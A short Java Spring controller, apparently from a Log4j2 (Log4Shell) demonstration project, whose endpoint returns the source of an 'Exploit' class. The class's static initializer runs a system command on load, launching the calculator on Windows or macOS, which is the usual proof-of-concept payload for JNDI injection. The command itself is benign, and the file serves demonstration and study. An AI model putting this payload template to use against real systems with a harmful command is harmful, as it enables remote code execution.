package com.cristik.sample.log4j2.controller;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping(value = "/test")
public class LogAttackController {

    @GetMapping(value = "/test/log")
    public String test() {
        return  "public class Exploit {\n" +
                "    public Exploit() {}\n" +
                "    static {\n" +
                "        try {\n" +
                "            String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"win\")\n" +
                "                    ? new String[]{\"cmd.exe\",\"/c\", \"calc.exe\"}\n" +
                "                    : new String[]{\"open\",\"/System/Applications/Calculator.app\"};\n" +
                "            java.lang.Runtime.getRuntime().exec(cmds).waitFor();\n" +
                "        }catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "    }\n" +
                "    public static void main(String[] args) {\n" +
                "        Exploit e = new Exploit();\n" +
                "    }\n" +
                "}";
    }
}
